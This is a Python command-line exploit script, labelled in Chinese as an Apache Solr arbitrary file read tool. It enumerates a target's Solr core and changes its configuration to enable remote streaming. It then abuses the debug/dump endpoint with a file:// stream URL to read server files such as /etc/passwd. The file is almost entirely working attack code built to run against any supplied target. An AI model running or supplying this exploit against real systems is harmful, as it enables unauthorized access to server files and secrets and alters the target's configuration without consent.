import requests,sys
from lxml import etree
import json
import click
from requests.packages.urllib3.exceptions import InsecureRequestWarning

def title():
    print('+------------------------------------------')
    print('+  \033[34mgithub: https://github.com/yaunsky                                   \033[0m')
    print('+  \033[34mVersion: apache solr 任意文件读取                                              \033[0m')
    print('+  \033[36m使用格式:  python3 solr-fileread.py   --help                                         \033[0m')
    print('+------------------------------------------')

def ScanCore(target):
    url = target + "/solr/admin/cores?indexInfo=false&wt=json"
    print(url)
    try:
        response = requests.request("GET", url=url, timeout=10)
        CoreName = list(json.loads(response.text)["status"])[0]
        print("\033[32m[+++++] 成功获得CoreName：" + target + "/solr/" + CoreName + "/config\033[0m")
        return CoreName
    except:
        print("\033[31m[-----] 目标Url漏洞利用失败\033[0m")
        sys.exit(0)

def scan(target,CoreName):
    url = target + "/solr/" + CoreName + "/config"
    headers = {
        "Content-type":"application/json"
    }
    data = '{"set-property" : {"requestDispatcher.requestParsers.enableRemoteStreaming":true}}'
    try:
        requests.packages.urllib3.disable_warnings(InsecureRequestWarning)
        response = requests.post(url=url, data=data, headers=headers, verify=False, timeout=5)
        if "This" in response.text and response.status_code == 200:
            print("\033[32m[+++++] 目标 {} 可能存在漏洞 \033[0m".format(target))
        else:
            print("\033[31m[-----] 目标 {} 不存在漏洞\033[0m".format(target))
            sys.exit(0)

    except Exception as e:
        print("\033[31m[xxxxx] 请求失败 \033[0m", e)

def exp(target,CoreName,FileName):
    url = target + "/solr/{}/debug/dump?param=ContentStreams".format(CoreName)
    headers = {
        "Content-Type": "application/x-www-form-urlencoded"
    }
    data = 'stream.url=file://{}'.format(FileName)
    try:
        requests.packages.urllib3.disable_warnings(InsecureRequestWarning)
        response = requests.post(url=url, data=data, headers=headers, verify=False, timeout=5)
        if "No such file or directory" in response.text:    
            print("\033[31m[-----] 读取{}失败 \033[0m".format(FileName))
        else:
            print("\033[36m[+++++] 读取内容:\n{} \033[0m".format(json.loads(response.text)["streams"][0]["stream"]))


    except Exception as e:
        print("\033[31m[xxxxx] 请求失败 \033[0m", e)

@click.command()
@click.option("--target", help='Target URL; Example:http://ip:port。')
@click.option("--filename", help="Target File; Example:/etc/passwd。")
def main(target,filename):
    title()
    CoreName = ScanCore(str(target))
    scan(str(target), CoreName)
    exp(target,CoreName,filename)
    
if __name__ == '__main__':
    main()
